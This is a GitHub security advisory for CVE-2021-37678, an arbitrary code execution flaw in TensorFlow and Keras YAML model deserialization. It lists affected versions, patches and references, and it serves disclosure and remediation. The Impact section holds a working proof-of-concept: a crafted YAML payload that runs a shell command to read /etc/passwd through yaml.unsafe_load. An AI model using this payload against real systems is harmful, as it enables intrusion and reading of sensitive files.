# [H] Arbitrary code execution due to YAML deserialization

## Summary
Severity: High
Advisory: GHSA-r6jx-9g48-2r5r
CVE: CVE-2021-37678
CWE: CWE-502
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2021-08-25
Source: https://github.com/advisories/GHSA-r6jx-9g48-2r5r
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.3.4
- PyPI: `tensorflow` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-cpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-gpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.1

## Details
### Impact
TensorFlow and Keras can be tricked to perform arbitrary code execution when deserializing a Keras model from YAML format.

```python
from tensorflow.keras import models

payload = '''
!!python/object/new:type
args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
listitems: "__import__('os').system('cat /etc/passwd')"
'''
  
models.model_from_yaml(payload)
```
  
The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/python/keras/saving/model_config.py#L66-L104) uses `yaml.unsafe_load` which can perform arbitrary code execution on the input.

### Patches
Given that YAML format support requires a significant amount of work, we have removed it for now.

We have patched the issue in GitHub commit [23d6383eb6c14084a8fc3bdf164043b974818012](https://github.com/tensorflow/tensorflow/commit/23d6383eb6c14084a8fc3bdf164043b974818012).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Arjun Shibu.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r6jx-9g48-2r5r
- https://nvd.nist.gov/vuln/detail/CVE-2021-37678
- https://github.com/tensorflow/tensorflow/commit/1df5a69e9f1a18a937e7907223066e606bf466b9
- https://github.com/tensorflow/tensorflow/commit/23d6383eb6c14084a8fc3bdf164043b974818012
- https://github.com/tensorflow/tensorflow/commit/8e47a685785bef8f81bcb996048921dfde08a9ab
- https://github.com/tensorflow/tensorflow/commit/a09ab4e77afdcc6e1e045c9d41d5edab63aafc1a
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-591.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-789.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-300.yaml
- https://github.com/tensorflow/tensorflow
